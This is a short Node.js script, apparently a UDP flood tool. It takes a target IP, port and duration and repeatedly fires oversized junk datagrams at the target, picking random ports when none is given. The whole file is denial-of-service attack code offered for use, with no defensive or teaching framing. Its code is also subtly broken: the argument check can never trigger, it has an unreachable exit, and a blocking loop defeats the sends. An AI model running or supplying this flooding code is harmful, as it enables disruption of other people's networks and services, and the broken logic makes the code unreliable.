if(!process.argv.length === 4) { 
    return "[x] Error, Invalid Arguments\r\nUsage: node " + process.argv[1] + " <ip> <port> <time> <method>";
    process.exit(0);
} else {
    udpFlood(process.argv[2], process.argv[3], process.argv[4]);
}

function udpFlood(host, port, timeout) {

    var HOST = host;
    var dgram = require('dgram');
    var client = dgram.createSocket('udp4');
  
    var output = "";
    for (var i = 65553; i >= 0; i--) {
      output += "X";
    };
  
    var startTime = new Date();
    while (1) {
  
      if (timeout) {
        var nowTime = new Date();
        if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
          break;
        }
      }
  
      var message = new Buffer(output);
  
      (function (PORT) {
        client.send(message, 0, message.length, PORT, HOST, function (err, bytes) {
          if (err) throw err;
          console.log('UDP message sent to ' + HOST + ':' + PORT);
        });
      })(port || Math.floor(Math.random() * (65553) + 1));
    };
  }